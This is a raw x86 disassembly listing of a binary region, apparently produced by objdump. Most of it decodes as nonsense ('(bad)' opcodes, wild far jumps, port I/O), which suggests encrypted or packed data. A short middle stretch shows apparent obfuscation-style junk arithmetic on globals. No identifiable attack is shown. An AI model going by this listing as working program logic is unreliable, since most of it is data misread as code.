  4035bf:	shl    DWORD PTR [edx-0x13],1
  4035c2:	adc    edi,DWORD PTR [eax+ecx*4-0x6]
  4035c6:	aam    0x36
  4035c8:	pop    edi
  4035c9:	adc    dh,bh
  4035cb:	fstp   DWORD PTR [ebp-0x31ff0f97]
  4035d1:	test   BYTE PTR [esi],0xb1
  4035d4:	cwde   
  4035d5:	sar    BYTE PTR es:[ebx+eax*8],0xd6
  4035da:	stos   DWORD PTR es:[edi],eax
  4035db:	and    edx,DWORD PTR [esi-0x324b851c]
  4035e1:	cmp    edi,DWORD PTR ds:[eax+0x50]
  4035e5:	dec    ebp
  4035e6:	and    esi,0xffffffe8
  4035e9:	bound  esi,QWORD PTR [edx-0x43]
  4035ec:	addr16 das 
  4035ee:	jnp    0x40364d
  4035f0:	or     BYTE PTR [edx+0x14fd4e09],dh
  4035f6:	dec    edx
  4035f7:	shl    BYTE PTR [edx-0x4529d9b4],1
  4035fd:	sub    ebx,DWORD PTR [edi+0x79]
  403600:	inc    ebp
  403601:	outs   dx,BYTE PTR ds:[esi]
  403602:	aam    0x37
  403604:	or     edi,ebx
  403606:	or     eax,0x5e6b1f9d
  40360b:	sbb    eax,DWORD PTR [ecx-0x44]
  40360e:	push   eax
  40360f:	pop    esi
  403610:	sbb    eax,DWORD PTR [ebp-0x140304a3]
  403616:	bound  esi,QWORD PTR [edi-0x24]
  403619:	lock mov cl,0x97
  40361c:	or     eax,0xd89efa49
  403621:	push   ecx
  403622:	mov    bl,0xf4
  403624:	mov    ebx,0x8b9ac22
  403629:	out    dx,eax
  40362a:	and    bl,BYTE PTR [ebp+0x4]
  40362d:	pop    ecx
  40362e:	shl    DWORD PTR [ecx],1
  403630:	dec    ebp
  403631:	jmp    0x3970:0xbb4abfa4
  403638:	fst    st(6)
  40363a:	cmp    al,BYTE PTR [edi-0x5eb26fbe]
  403640:	enter  0x8da3,0x22
  403644:	and    al,0x32
  403646:	jnp    0x403609
  403648:	xchg   esi,eax
  403649:	lock js 0x4035d1
  40364c:	mov    edi,0x9aaf1939
  403651:	inc    edx
  403652:	mov    dh,0x4f
  403654:	sbb    edi,DWORD PTR [eax-0x3dc00e6a]
  40365a:	xchg   ebp,eax
  40365b:	outs   dx,BYTE PTR ds:[esi]
  40365c:	mov    DWORD PTR [edx+eax*2],eax
  40365f:	test   al,0x6d
  403661:	xor    eax,0x88a46947
  403666:	jmp    0x8461:0xcd0f9300
  40366d:	xor    dh,BYTE PTR [ebp+0xf]
  403670:	int3   
  403671:	jp     0x4036a1
  403673:	cmp    al,0x53
  403675:	fadd   QWORD PTR [ebx]
  403677:	ja     0x403601
  403679:	jno    0x4036ab
  40367b:	cmp    ebx,esp
  40367d:	(bad)  
  40367e:	mov    ebp,0x35aec130
  403683:	cmp    al,0x3c
  403685:	and    WORD PTR [edi],di
  403688:	clc    
  403689:	nop
  40368a:	xchg   edx,eax
  40368b:	(bad)  
  40368c:	add    ax,0x45ca
  403690:	lods   al,BYTE PTR ds:[esi]
  403691:	cmp    BYTE PTR [ecx-0x6c7e6de8],ch
  403697:	(bad)  
  403698:	retf   0x1ae5
  40369b:	retf   
  40369c:	call   0xdfd5:0x2c7c55cf
  4036a3:	rol    DWORD PTR [esi-0x13cf883],cl
  4036a9:	push   esi
  4036aa:	mov    edx,ss
  4036ac:	mov    edx,ebx
  4036ae:	lock pop ds
  4036b0:	aaa    
  4036b1:	(bad)  
  4036b2:	inc    ecx
  4036b4:	inc    ebp
  4036b5:	push   ebp
  4036b6:	leave  
  4036b7:	je     0x4036d2
  4036b9:	retf   
  4036ba:	dec    ecx
  4036bb:	cmp    eax,0x5e958ab3
  4036c0:	out    dx,al
  4036c1:	mov    eax,ds:0xe29a304b
  4036c6:	and    cl,0x4a
  4036c9:	adc    DWORD PTR [edi-0x2ad4e951],edi
  4036cf:	fnsave [edi]
  4036d1:	add    ecx,DWORD PTR [edi+0x51ce4ca1]
  4036d7:	adc    BYTE PTR [edx+edi*4],dh
  4036da:	mov    ebp,0xb2bd50cc
  4036df:	lahf   
  4036e0:	sbb    eax,0x58f8e355
  4036e5:	icebp  
  4036e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e7:	imul   esp,DWORD PTR [edx+eiz*8-0x57bf7602],0x1d
  4036ef:	or     BYTE PTR [esi+edi*8-0x7c],0x45
  4036f4:	adc    cl,bl
  4036f6:	test   al,0x51
  4036f8:	jae    0x403689
  4036fa:	call   0xe389:0x720296f9
  403701:	mov    al,0xb7
  403703:	jmp    0x4036f0
  403705:	add    DWORD PTR [eax],ebx
  403707:	call   0x1ec5222a
  40370c:	xlat   BYTE PTR ds:[ebx]
  40370d:	test   eax,0xf66e8971
  403712:	shl    BYTE PTR [edx],0xef
  403715:	test   DWORD PTR [eax-0x71],esp
  403718:	mov    ecx,0x4c8bdc8c
  40371d:	sar    BYTE PTR [ecx-0x3a9f78],0x3
  403724:	test   BYTE PTR [edi+0x70],bh
  403727:	das    
  403728:	mov    ds:0x64640ebb,eax
  40372d:	iret   
  40372e:	xchg   edx,eax
  40372f:	(bad)  
  403730:	ja     0x403745
  403732:	fs lock scas al,BYTE PTR es:[edi]
  403735:	push   esp
  403736:	mov    cl,0xd9
  403738:	fs inc esi
  40373a:	jle    0x4036f3
  40373c:	inc    eax
  40373d:	jo     0x403717
  40373f:	or     eax,0x97c63d67
  403744:	test   DWORD PTR [ebx-0x32],edi
  403747:	mov    eax,0x22685e3a
  40374c:	addr16 leave 
  40374e:	push   0x2371fc4b
  403753:	in     eax,0xc9
  403755:	call   0x39a5:0x1c4691a7
  40375c:	push   eax
  40375d:	fnsave [edi]
  40375f:	call   0xdd48d8c
  403764:	xchg   esp,eax
  403765:	mov    ch,0x1c
  403767:	imul   ebp,DWORD PTR [esi+0x1cfab7b2],0x3cdefbaa
  403771:	ss dec edi
  403773:	inc    ebx
  403774:	push   0xcf9dcb96
  403779:	loop   0x4037a2
  40377b:	xchg   edi,eax
  40377c:	pop    edx
  40377d:	push   cs
  40377e:	rol    DWORD PTR [edi-0x4c],1
  403781:	sbb    BYTE PTR [ebp-0x3f4218ec],dh
  403787:	xchg   BYTE PTR [ecx-0x74],al
  40378a:	ja     0x4037ab
  40378c:	sbb    DWORD PTR [ecx+0x56],ebp
  40378f:	out    dx,al
  403790:	or     BYTE PTR [ebp+0x5f],cl
  403793:	gs xchg ebx,eax
  403795:	int3   
  403796:	push   0x58a4e614
  40379b:	pop    eax
  40379c:	mov    dh,0x71
  40379e:	sbb    ebp,ecx
  4037a0:	pushf  
  4037a1:	dec    ebp
  4037a2:	and    eax,0xa91b195b
  4037a7:	inc    ecx
  4037a8:	jnp    0x4037b3
  4037aa:	push   ds
  4037ab:	or     eax,0xbd201848
  4037b0:	xor    al,0xeb
  4037b2:	fsubr  DWORD PTR [edi]
  4037b4:	pop    ss
  4037b5:	(bad)  
  4037b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037b7:	(bad)  
  4037b8:	rcr    dh,1
  4037ba:	mov    ah,0x66
  4037bc:	sahf   
  4037bd:	mov    DWORD PTR [eax+0x26],ebx
  4037c0:	aad    0xe8
  4037c2:	inc    esi
  4037c3:	pop    edi
  4037c4:	xor    al,0x2d
  4037c6:	mov    esi,0x44416cda
  4037cb:	push   edx
  4037cc:	push   ebx
  4037cd:	outs   dx,DWORD PTR ds:[esi]
  4037ce:	mov    ebx,edi
  4037d0:	inc    edx
  4037d1:	jae    0x403761
  4037d3:	fwait
  4037d4:	mov    ebp,0x3bb64225
  4037d9:	push   ds
  4037da:	fsubp  st(0),st
  4037dc:	add    eax,0xafbac28e
  4037e1:	ds mov cl,0xf2
  4037e4:	dec    ebx
  4037e5:	shl    DWORD PTR [ecx+0x9],0x6
  4037e9:	ss mov al,fs:0xb2e05e57
  4037f0:	sbb    edx,edi
  4037f2:	push   edi
  4037f3:	out    dx,eax
  4037f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037f5:	add    DWORD PTR [eax+0x3adeb03f],eax
  4037fb:	shl    DWORD PTR [esi-0x14b2250f],1
  403801:	ss jmp 0xccf6cb8
  403807:	dec    eax
  403808:	sbb    BYTE PTR [ebx-0x66],dh
  40380b:	mov    DWORD PTR [edi+0x58641218],ecx
  403811:	mov    BYTE PTR [eax+edx*2-0x5ec52bfb],ah
  403818:	aas    
  403819:	cld    
  40381a:	leave  
  40381b:	cld    
  40381c:	adc    BYTE PTR [edi+ebp*2-0x68],al
  403820:	retf   
  403821:	mov    ds:0xd84b679a,al
  403826:	aas    
  403827:	cdq    
  403828:	fidiv  WORD PTR [ebp-0x29a88a30]
  40382e:	ins    BYTE PTR es:[edi],dx
  40382f:	repnz imul dl
  403832:	(bad)  
  403833:	push   0xcec096a1
  403838:	xchg   ebp,eax
  403839:	dec    esi
  40383a:	out    0xf8,eax
  40383c:	jg     0x403830
  40383e:	mov    DWORD PTR [esi],eax
  403840:	inc    ecx
  403841:	xor    al,0x91
  403843:	mov    es,WORD PTR [esi+edi*4-0x2ac309b0]
  40384a:	pop    eax
  40384b:	hlt    
  40384c:	inc    edi
  40384d:	cmp    eax,0xbba89dcd
  403852:	hlt    
  403853:	popa   
  403854:	mov    dh,0x34
  403856:	push   ebx
  403857:	mov    BYTE PTR [ebp+0x27],ch
  40385a:	jne    0x403835
  40385c:	jne    0x403896
  40385e:	jle    0x4037f3
  403860:	ins    BYTE PTR es:[edi],dx
  403861:	push   esi
  403862:	pop    ebx
  403863:	pop    esp
  403864:	lds    ebp,FWORD PTR fs:[ebx]
  403867:	sub    DWORD PTR [edi-0x57],esi
  40386a:	fwait
  40386b:	jne    0x4037f6
  40386d:	mov    al,0x22
  40386f:	test   al,0xb9
  403871:	sbb    eax,0x95bf53ef
  403876:	jg     0x40387a
  403878:	cli    
  403879:	mov    ebp,0x7de7273e
  40387e:	cmp    BYTE PTR [edx+0x4d9e5a04],0xe1
  403885:	pusha  
  403886:	dec    esi
  403887:	xchg   edx,eax
  403888:	mov    eax,0xde3f86
  40388d:	js     0x4038ee
  40388f:	mov    ecx,0x55af712c
  403894:	dec    ebx
  403895:	addr16 adc al,0x6
  403898:	ficomp WORD PTR [ebx]
  40389a:	and    edx,esi
  40389c:	push   edx
  40389d:	jno    0x403899
  40389f:	aaa    
  4038a0:	cwde   
  4038a1:	adc    BYTE PTR [esi-0x42],bl
  4038a4:	aaa    
  4038a5:	mov    ch,0xa
  4038a7:	jnp    0x40389b
  4038a9:	test   al,0x36
  4038ab:	mov    eax,ds:0xeff8af8b
  4038b0:	dec    ebp
  4038b1:	das    
  4038b2:	xor    eax,0x2c7a4e6f
  4038b7:	repz dec esi
  4038b9:	sbb    dh,BYTE PTR [esi+0x6d]
  4038bc:	in     al,dx
  4038bd:	sub    dh,BYTE PTR [ebx+eax*1+0x5e4a374b]
  4038c4:	ss call 0xfa0b5436
  4038ca:	fbstp  TBYTE PTR [ebx+0x1d]
  4038cd:	push   0x2
  4038cf:	popf   
  4038d0:	mov    ecx,0xd148e8e3
  4038d5:	call   0x9cac4a35
  4038da:	icebp  
  4038db:	retf   
  4038dc:	or     eax,0xb8c5290c
  4038e1:	int3   
  4038e2:	icebp  
  4038e3:	xchg   edi,eax
  4038e4:	fmul   QWORD PTR [edi]
  4038e6:	lods   al,BYTE PTR ds:[esi]
  4038e7:	rol    DWORD PTR [edx],1
  4038e9:	xor    DWORD PTR ds:0x428465,0x428515
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x4283f9,0x428521
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x4283e5,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x4283ad
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x4284f9,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [edi+ebp*1-0x421c1a1b]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0x94655c4d
  403949:	retf   
  40394a:	sub    al,BYTE PTR [ebx+0x6b6acbd6]
  403950:	mov    al,ds:0x3f04da61
  403955:	mov    al,0xdb
  403957:	pop    ebx
  403958:	fldenv [eax+0xb]
  40395b:	fmul   st(2),st
  40395d:	and    al,0xcd
  40395f:	mov    ds:0xab0cb4e6,eax
  403964:	mov    cl,0x27
  403966:	bnd call 0x371a9901
  40396c:	sub    al,0x7f
  40396e:	add    DWORD PTR [ebx+edi*1+0x27],ecx
  403972:	in     eax,dx
  403973:	js     0x40395c
  403975:	xchg   esp,eax
  403976:	sub    ebp,DWORD PTR [edx+0x4d178237]
  40397c:	mov    al,ds:0x5cf146aa
  403981:	adc    BYTE PTR [eax+0x3e],cl
  403984:	adc    ebx,eax
  403986:	dec    esp
  403987:	mov    bl,0xc6
  403989:	or     eax,0x361d7e54
  40398e:	out    dx,eax
  40398f:	stc    
  403990:	add    ecx,DWORD PTR [ecx+esi*8-0x79477b3e]
  403997:	mov    BYTE PTR [ebp-0x12],cl
  40399a:	retf   0x9b79
  40399d:	and    al,0xaa
  40399f:	call   0xae4206e6
  4039a4:	jns    0x403970
  4039a6:	adc    DWORD PTR [eax+0xb1b95e8],eax
  4039ac:	cld    
  4039ad:	lock hlt 
  4039af:	pop    esp
  4039b0:	pusha  
  4039b1:	dec    edi
  4039b2:	sbb    ecx,ecx
  4039b4:	dec    eax
  4039b5:	mov    dl,0x33
  4039b7:	call   0xd6557e59
  4039bc:	mov    eax,ds:0x9a4875b
  4039c1:	mov    DWORD PTR ds:0x7d465651,esp
  4039c7:	dec    ecx
  4039c8:	mov    ebx,0x78ebf914
  4039cd:	aaa    
  4039ce:	pusha  
  4039cf:	inc    esi
  4039d0:	js     0x403a0e
  4039d2:	(bad)  
  4039d3:	jp     0x40399e
  4039d5:	xchg   ebx,ebp
  4039d7:	out    0xd0,eax
  4039d9:	push   esi
  4039da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039db:	mov    ch,0x36
  4039dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039de:	retf   
  4039df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e0:	lea    esi,[ebx]
  4039e2:	out    dx,al
  4039e3:	loopne 0x4039ff
  4039e5:	push   0x4e56657b
  4039ea:	sbb    eax,0x8f06c853
  4039ef:	dec    eax
  4039f0:	loopne 0x403a0a
  4039f2:	leave  
  4039f3:	pop    esi
  4039f4:	mov    esp,0x2ce980b1
  4039f9:	ja     0x4039b4
  4039fb:	pop    esp
  4039fc:	outs   dx,DWORD PTR ds:[esi]
  4039fd:	scas   al,BYTE PTR es:[edi]
  4039fe:	add    bl,bh
  403a00:	int    0x2a
  403a02:	inc    edi
  403a03:	out    0xb8,al
  403a05:	and    eax,0x4452df18
  403a0a:	and    al,0x24
  403a0c:	jg     0x4039bb
  403a0e:	lock mov WORD PTR [esi],es
  403a11:	ds add eax,0xcc5f0f5c
  403a17:	aad    0x9b
  403a19:	aaa    
  403a1a:	or     al,0x48
  403a1c:	dec    edi
  403a1d:	sbb    eax,0xba3c90a4
  403a22:	inc    eax
  403a23:	mov    edi,0x9a9d2090
  403a28:	data16 sbb cl,BYTE PTR [esi+0x15]
  403a2c:	jl     0x4039c7
  403a2e:	hlt    
  403a2f:	mov    al,0x63
  403a31:	sar    BYTE PTR [edx],cl
  403a33:	lea    ebp,ds:0x6cfae89b
  403a39:	xor    BYTE PTR [edi-0x12],ch
  403a3c:	cmp    ch,al
  403a3e:	neg    BYTE PTR [edx]
  403a40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a41:	mov    esi,0x1d4ea5c
  403a46:	enter  0xf07a,0xbc
  403a4a:	xchg   edi,eax
  403a4b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  403a4d:	adc    BYTE PTR [edx+0x306a4ec8],0x66
  403a54:	pop    esp
  403a55:	inc    edx
  403a56:	in     al,0x57
  403a58:	rol    DWORD PTR [edi],cl
  403a5a:	xor    DWORD PTR [ebp+0x59e93041],esp
  403a60:	push   ds
  403a61:	xchg   ebp,eax
  403a62:	push   cs
  403a63:	int    0xbd
  403a65:	fs lock loop 0x403ad0
  403a69:	dec    eax
  403a6a:	add    bh,BYTE PTR [ebx+0x5]
  403a6d:	mov    WORD PTR [ecx],?
  403a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a70:	mov    dh,0x60
  403a72:	xor    edx,DWORD PTR [edi+0x26]
  403a75:	add    BYTE PTR [ecx+0x6bb07a47],cl
  403a7b:	xor    eax,0xc5a6876
  403a80:	idiv   DWORD PTR [ebp-0xf72154f]
  403a86:	push   ds
  403a87:	pop    esp
  403a88:	(bad)  
  403a89:	pop    esi
  403a8a:	mul    ebx
  403a8c:	add    bh,BYTE PTR [ebx+esi*4+0x6b]
  403a90:	xor    eax,edx
  403a92:	rcr    ah,0xd
  403a95:	ret    
  403a96:	push   0xbaabd4a5
  403a9b:	push   0xffffffc4
  403a9d:	sub    eax,0xd65b32b4
  403aa2:	out    dx,eax
  403aa3:	(bad)  
  403aa4:	pop    esp
  403aa5:	data16 data16 add dh,BYTE PTR ds:0x29d60026
  403aad:	or     eax,0xcc9d81fb
  403ab2:	cmp    eax,0x72acf2a4
  403ab7:	jae    0x403b24
  403ab9:	dec    ebx
  403aba:	ror    BYTE PTR [ecx-0x4468153d],cl
  403ac0:	mov    bl,0xab
  403ac2:	hlt    
  403ac3:	imul   edi,esi,0xffffffa2
  403ac6:	dec    ebx
  403ac7:	sub    al,0x5f
  403ac9:	sbb    al,0xf3
  403acb:	addr16 mov cl,0xe9
  403ace:	or     cl,bl
  403ad0:	cld    
  403ad1:	(bad)  
  403ad2:	mov    dl,0x4d
  403ad4:	jecxz  0x403a68
  403ad6:	aam    0x61
  403ad8:	cli    
  403ad9:	xchg   esi,eax
  403ada:	push   es
  403adb:	icebp  
  403adc:	ds in  eax,dx
  403ade:	push   eax
  403adf:	mov    ecx,0x170f719
  403ae4:	fnsave [eax-0x38]
  403ae7:	(bad)  [esi]
  403ae9:	push   ebp
  403aea:	inc    edi
  403aeb:	mov    ah,0x1
  403aed:	sub    ah,BYTE PTR [esi+0x397b522b]
  403af3:	fstp   TBYTE PTR [ecx]
  403af5:	and    DWORD PTR [esi],edx
  403af7:	adc    al,BYTE PTR [edx]
  403af9:	mov    DWORD PTR [ecx],ecx
  403afb:	pop    ss
  403afc:	xchg   ecx,eax
  403afd:	mov    al,ds:0x2861104d
  403b02:	jmp    0x482fca36
  403b07:	cmp    DWORD PTR [edi+ebp*8+0x5fac0280],edx
  403b0e:	fidiv  DWORD PTR [eax]
  403b10:	add    edx,edi
  403b12:	inc    ebx
  403b13:	sub    esi,ebp
  403b15:	xchg   ebp,eax
  403b16:	sahf   
  403b17:	lahf   
  403b18:	cmp    al,0xa1
  403b1a:	dec    ebp
  403b1b:	and    ebx,esp
  403b1d:	out    0xdc,al
  403b1f:	xor    eax,DWORD PTR [ebx+0x14]
  403b22:	adc    BYTE PTR [esi+0x289a1e71],bh
  403b28:	push   0x7a20e8ac
  403b2d:	mov    BYTE PTR [edx],0xc7
  403b30:	sub    eax,0x55a417ad
  403b35:	pop    es
  403b36:	mov    edx,0x718cb60d
  403b3b:	xor    DWORD PTR [edx+0x28a3d516],0x4b
  403b42:	pop    ebp
  403b43:	scas   eax,DWORD PTR es:[edi]
  403b44:	mov    ds:0x35803b9b,eax
  403b49:	inc    ecx
  403b4a:	fwait
  403b4b:	sub    eax,eax
  403b4d:	xchg   dl,dl
  403b4f:	jae    0x403b03
  403b51:	js     0x403ae9
  403b53:	mov    cl,0x98
  403b55:	sbb    ch,BYTE PTR [eax-0x5832f36e]
  403b5b:	scas   al,BYTE PTR es:[edi]
  403b5c:	xchg   bh,bh
  403b5e:	inc    esp
  403b5f:	pop    esi
  403b60:	(bad)  
  403b61:	pop    ds
  403b62:	sbb    DWORD PTR [esp+edi*8-0x1e142d4b],ecx
  403b69:	outs   dx,BYTE PTR ds:[esi]
  403b6a:	and    al,0xd3
  403b6c:	pop    ds
  403b6d:	sub    BYTE PTR [edx],ah
  403b6f:	and    ecx,edi
  403b71:	cmp    ebx,edx
  403b73:	pop    esp
  403b74:	inc    esp
  403b75:	pop    esi
  403b76:	aad    0x37
  403b78:	adc    BYTE PTR [ebp+ecx*1+0x4f],0xc9
  403b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b7e:	mov    ds:0x297fad46,eax
  403b83:	jb     0x403b54
  403b85:	stos   DWORD PTR es:[edi],eax
  403b86:	sar    DWORD PTR [eax+0x74],0x94
  403b8a:	dec    edi
  403b8c:	jo     0x403b1f
  403b8e:	push   0xffffff90
  403b90:	push   eax
  403b91:	sbb    esi,esi
  403b93:	adc    BYTE PTR [edi-0x3dc70b2],bh
  403b99:	mov    ecx,0xfd16ab84
  403b9e:	shl    BYTE PTR [esi+0x6a],0xa3
  403ba2:	cmp    BYTE PTR [esi],al
  403ba4:	mov    esp,0x420efd27
  403ba9:	adc    edi,esp
  403bab:	mov    dl,0xe8
  403bad:	pop    es
  403bae:	mov    ah,0xca
  403bb0:	and    BYTE PTR [esi+0x4],0x71
  403bb4:	pop    ecx
  403bb5:	mov    ebp,esi
  403bb7:	mov    BYTE PTR [ecx+ebx*2-0x6c44af6a],0xb3
  403bbf:	dec    ecx
  403bc0:	loope  0x403b77
  403bc2:	jmp    0x403bd7
  403bc4:	hlt    
  403bc5:	cmp    DWORD PTR [edi+0x54750aed],esp
  403bcb:	cmp    eax,0x7b30e8dc
  403bd0:	retf   
  403bd1:	shl    DWORD PTR [ecx],0x54
  403bd4:	popf   
  403bd5:	sbb    BYTE PTR [eax-0x2eaff4b0],al
  403bdb:	dec    esi
  403bdc:	pop    ds
  403bdd:	aam    0xd1
  403bdf:	add    dh,ah
  403be1:	lahf   
  403be2:	popf   
  403be3:	(bad)  
  403be4:	jmp    0x11b34639
  403be9:	and    eax,0x7e1faf58
  403bee:	push   0xffffff80
  403bf0:	icebp  
  403bf1:	dec    edi
  403bf2:	int    0xa3
  403bf4:	pop    ebx
  403bf5:	jecxz  0x403bc2
  403bf7:	jo     0x403ba6
  403bf9:	lahf   
  403bfa:	inc    esp
  403bfb:	dec    DWORD PTR [ebx]
  403bfd:	xchg   ebx,eax
  403bfe:	cmp    edi,DWORD PTR [esi-0x11]
  403c01:	shl    BYTE PTR [ecx-0x2861fd09],cl
  403c07:	cmp    bh,al
  403c09:	adc    BYTE PTR [eax+0x9],cl
  403c0c:	mov    ds:0x1a48b73,eax
  403c11:	iret   
  403c12:	fadd   QWORD PTR [eax-0x5]
  403c15:	fcom   QWORD PTR [eax+0x139ef295]
  403c1b:	mov    ds:0x6a4e815d,ax
  403c21:	sub    bh,ch
  403c23:	cmp    DWORD PTR [eax],0x2ba756f0
  403c29:	add    BYTE PTR [eax-0x28],ch
  403c2c:	aad    0xf4
  403c2e:	and    ch,ch
  403c30:	ins    BYTE PTR es:[edi],dx
  403c31:	adc    al,0x95
  403c33:	adc    cx,bp
  403c36:	nop
  403c37:	inc    edi
  403c38:	imul   eax,DWORD PTR [esi],0xc0a73ddb
  403c3e:	inc    ecx
  403c3f:	stc    
  403c40:	add    DWORD PTR [ebx],edx
  403c42:	imul   esp,DWORD PTR [ebp+edx*2-0x3a],0x61
  403c47:	xor    al,BYTE PTR [esi-0x17]
  403c4a:	test   al,0xea
  403c4c:	xchg   esp,eax
  403c4d:	test   al,0x90
  403c4f:	in     eax,0x5d
  403c51:	add    eax,0x25d879a1
  403c56:	pop    edi
  403c57:	sahf   
  403c58:	jbe    0x403c18
  403c5a:	fsub   QWORD PTR [edx]
  403c5c:	or     DWORD PTR [esi+edx*8-0x7e9d65cb],eax
  403c63:	inc    ecx
  403c64:	out    0xa0,al
  403c66:	std    
  403c67:	xor    al,0x24
  403c69:	inc    ebx
  403c6a:	cld    
  403c6b:	lds    esi,FWORD PTR [ebp+0x95dcacf]
  403c71:	fdiv   QWORD PTR [ecx-0xfba74db]
  403c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c78:	and    dl,BYTE PTR [eax]
  403c7a:	bound  eax,QWORD PTR ds:0x79bd768a
  403c80:	imul   esp,DWORD PTR [ebx],0x8b0bc0ac
  403c86:	cmc    
  403c87:	sar    ah,cl
  403c89:	inc    ebx
  403c8a:	call   0x19d0:0x51fcef70
  403c91:	in     eax,dx
  403c92:	cmp    al,0xc8
  403c94:	mov    BYTE PTR [eax],cl
  403c96:	add    esp,DWORD PTR [ebp+0x9]
  403c99:	(bad)  
  403c9a:	sbb    al,0x50
  403c9c:	xor    eax,0x7230d87e
  403ca1:	ret    
  403ca2:	adc    bh,dl
  403ca4:	or     DWORD PTR [esi+0x75],esp
  403ca7:	dec    ebx
  403ca8:	adc    al,0x4a
  403caa:	sbb    BYTE PTR [esp+eiz*2],dh
  403cad:	mov    ah,0x29
  403caf:	fs ds sar ch,1
  403cb3:	popa   
  403cb4:	sbb    ch,ah
  403cb6:	(bad)  
  403cb7:	sbb    dl,dh
  403cb9:	add    eax,0xb9f187f4
  403cbe:	(bad)  
  403cbf:	les    ebx,FWORD PTR [ebx]
  403cc1:	fs add al,0x92
  403cc4:	call   FWORD PTR [eax+0x34]
  403cc7:	enter  0xc1ae,0xea
  403ccb:	add    cl,BYTE PTR [edi]
  403ccd:	mov    bh,0x15
  403ccf:	mov    cl,0x83
  403cd1:	inc    edx
  403cd2:	add    BYTE PTR [ecx],ah
  403cd4:	adc    eax,0x4283ad
  403cd9:	mov    edx,DWORD PTR [ebp+0x1c]
  403cdc:	cmp    DWORD PTR ds:0x428415,0x0
  403ce3:	mov    edx,0xb30
  403ce8:	not    DWORD PTR ds:0x4282dd
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x4282e1,0x7955
  403cfd:	mov    DWORD PTR ds:0x42846d,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428415,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x4283ad,edi
  403d37:	xor    DWORD PTR ds:0x4283b9,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428419
  403d43:	sub    DWORD PTR ds:0x428305,edi
  403d49:	sbb    DWORD PTR ds:0x428421,0x3090
  403d53:	sub    DWORD PTR ds:0x4283d1,ecx
  403d59:	xor    DWORD PTR ds:0x42847d,edi
  403d5f:	cmp    DWORD PTR ds:0x4284ed,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x4284ed,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x4283e5
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x4284c1
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x4282cd,edx
  403da2:	adc    DWORD PTR ds:0x4283c9,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428511
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x4283e5,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x4282d5,0x4282e9
  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x428479,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428501
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
  403df8:	sub    DWORD PTR ds:0x4283ad,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x4283ad,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	sar    DWORD PTR [ebx-0x412ed930],1
  403e28:	cmc    
  403e29:	mov    esi,0xbec4bdbe
  403e2e:	mov    esi,0xdb6a325d
  403e33:	fs pop edi
  403e35:	test   eax,0xae3bc047
  403e3a:	out    0xff,eax
  403e3c:	push   es
  403e3d:	adc    DWORD PTR [eax-0x6b63f626],ebx
  403e43:	icebp  
  403e44:	jmp    0x403e0f
  403e46:	dec    edi
  403e47:	inc    edx
  403e48:	lea    edi,[esi+0x19]
  403e4b:	push   ebx
  403e4c:	xchg   BYTE PTR [esi],bl
  403e4e:	jns    0x403def
  403e50:	dec    esi
  403e51:	cmp    al,0xd1
  403e53:	loopne 0x403e62
  403e55:	pusha  
  403e56:	sub    BYTE PTR [ebx],0xc6
